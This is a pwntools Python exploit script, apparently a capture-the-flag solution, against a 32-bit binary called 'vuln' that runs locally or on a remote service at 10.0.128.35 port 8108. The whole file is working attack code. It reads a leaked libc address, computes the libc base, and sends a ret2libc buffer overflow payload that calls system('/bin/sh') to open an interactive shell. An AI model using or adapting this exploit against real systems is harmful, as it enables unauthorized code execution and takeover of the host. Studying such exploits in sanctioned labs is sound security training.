from pwn import *
elf_file = FILENAME = './vuln'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log

HOST = '10.0.128.35'
POST = 8108
libc = ELF('./libc6_2.39-0ubuntu9_i386.so')


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
elif len(sys.argv) > 1 and sys.argv[1] == 'd':
  c = process(FILENAME)
  gdb.attach(c)
else:
  c = process(FILENAME)

c.recvuntil('0804c004: (')
_1 = c.recv(2)
c.recv(1)
_2 = c.recv(2)
c.recv(1)
_3 = c.recv(2)
c.recv(1)
_4 = c.recv(2)

__libc_start_main_addr = int(bytes.decode((b'0x'+_4+_3+_2+_1)),16)

libc.address= __libc_start_main_addr - libc.symbols['__libc_start_main']
print(hex(libc.address))

system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh'))
payload  = b'a'*0x10
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(bin_sh_addr)

c.sendlineafter('Name?',payload)



c.interactive()
